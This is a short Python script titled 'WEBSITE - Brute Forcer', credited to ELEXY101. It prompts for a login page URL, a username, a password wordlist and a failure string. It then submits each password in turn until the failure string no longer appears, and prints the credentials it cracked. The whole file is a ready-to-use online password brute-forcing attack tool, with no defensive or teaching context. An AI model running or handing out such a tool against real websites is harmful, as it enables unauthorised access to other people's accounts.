
import requests
from termcolor import colored
print("############################################")
print('########## WEBSITE - Brute Forcer ##########')
print('########## Created By - ELEXY101 ###########')
print('############################################')

#web page url
url = input('[+] Enter Page URL: ')
#username to brute-force with
username = input('[+] Enter Username For The Account To Bruteforce: ')
#password in the directory
password_file = input('[+] Enter Password File To Use: ')
#what output whenever a login fails
login_failed_string = input('[+] Enter String That Occurs When Login Fails: ')
#cookie value => Optional
cookie_value = input('Enter Cookie Value(Optional): ')

#CRACKING FUNCTION BEGINS
def cracking(username,url):
	for password in passwords:
		password = password.strip()
		print(colored(('Trying: ' + password), 'red'))
		data = {'user':username,'pass':password,'submit1':'submit'}
		#cookie => optional
		if cookie_value != '':
			response = requests.get(url, params={'user':username,'pass':password,'submit1':'submit'}, cookies = {'Cookie': cookie_value})
		else:
			response = requests.post(url, data=data)
		#login fails
		if login_failed_string in response.content.decode():
			pass
		else:
			#stops in case username and password matches
			print(colored(('[+] Found Username: ==> ' + username), 'green'))
			print(colored(('[+] Found Password: ==> ' + password), 'green'))
			exit()




with open(password_file, 'r') as passwords:
	cracking(username,url)

print('[!!] Password Not In List')


